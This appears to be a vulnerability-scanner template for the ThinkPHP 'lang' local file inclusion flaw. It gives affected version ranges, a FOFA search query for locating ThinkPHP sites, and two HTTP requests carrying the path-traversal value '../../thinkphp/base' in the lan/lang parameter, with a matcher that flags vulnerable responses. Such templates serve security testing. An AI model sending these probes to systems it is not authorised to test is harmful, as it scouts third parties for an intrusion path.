id: thinkphp5_lang_lfi

info:
  name: Thinkphp lang LFI
  author: kagamigawa
  severity: high
  description: Thinkphp,v6.0.1~v6.0.13, v5.0.x~v5.1.41, v5.0.0~v5.0.24. For details, see https://tttang.com/archive/1865/.
  metadata:
    max-request: 1
    fofa-query: app="thinkphp"
    verified: true
  tags: thinkphp, lfi

http:
  - raw:
      - |
        GET /?lan=../../thinkphp/base HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /?lang=../../thinkphp/base HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && status_code_2==500 && contains(tolower(body_2), '#f7f7f7')"
